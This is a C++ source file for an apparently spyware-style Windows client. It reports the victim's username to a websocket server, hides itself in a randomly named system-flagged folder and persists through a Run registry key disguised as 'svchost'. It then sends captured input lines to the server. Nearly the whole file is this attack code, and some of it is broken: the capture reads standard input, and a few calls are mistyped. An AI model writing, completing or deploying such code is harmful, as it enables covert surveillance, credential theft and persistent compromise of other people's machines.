#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <websocketpp/config/asio_no_tls.hpp>
#include <websocketpp/client.hpp>
#include <boost/asio.hpp>
#include <boost/process.hpp>
#include <windows.h>
#include <random>
#include <algorithm>
#include <fstream>

using websocketpp::client;
using websocketpp::connection_hdl;

class WebSocketClient {
public:
    WebSocketClient(const std::string& url) : url(url) {
        client_instance.init_asio();
        websocketpp::lib::error_code ec;
        connection_hdl = client_instance.get_connection(url, ec);
        client_instance.connect(connection_hdl);
    }

    void sendMessage(const std::string& message) {
        websocketpp::lib::error_code ec;
        client_instance.send(connection_hdl, message, websocketpp::frame::opcode::text, ec);
        if (ec) {
            std::cout << "Error sending message: " << ec.message() << std::endl;
        }
    }

    static std::string generateRandomString(size_t length) {
        const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::string result;
        std::random_device rd;
        std::mt19937 generator(rd());
        std::uniform_int_distribution<> distribution(0, sizeof(charset) - 2);
        
        for (size_t i = 0; i < length; ++i) {
            result += charset[distribution(generator)];
        }
        return result;
    }

    void hideDirectory(const std::string& path) {
        std::string command = "attrib +h +s " + path;
        system(command.c_str());
    }

    void addToStartup(const std::string& file_path) {
        HKEY hKey;
        RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
        RegSetValueEx(hKey, "svchost", 0, REG_SZ, (const BYTE*)file_path.c_str(), file_path.size() + 1);
        RegCloseKey(hKey);
    }

    void run() {
        std::string username = boost::process::system("whoami");
        sendMessage("I'm Connected | Username : " + username);

        std::string folder_name = generateRandomString(16);
        std::string folder_path = "C:\\" + folder_name;
        CreateDirectory(folder_path.c_str(), NULL);
        hideDirectory(folder_path);

        char file_path[MAX_PATH];
        GetModuleFileName(NULL, file_path, MAX_PATH);
        std::string current_file_path = file_path;

        std::string new_file_path = folder_path + "\\" + std::string(file_path).substr(std::string(file_path).find_last_of("\\") + 1);
        MoveFile(current_file_path.c_str(), new_file_path.c_str());
        addToStartup(new_file_path);

        std::vector<std::string> data;
        std::string text;

        while (true) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            char event;
            std::cin >> event;
            data.push_back(std::string(1, event));

            if (event == '\n') {
                text = std::accumulate(data.begin(), data.end(), std::string());
                sendMessage(text);
                data.clear();
            }
        }
    }

private:
    client<websocketpp::config::asio> client_instance;
    connection_hdl connection_hdl;
    std::string url;
};

int main() {
    WebSocketClient wsClient("ws://localhost:8989");
    wsClient.run();
    return 0;
}

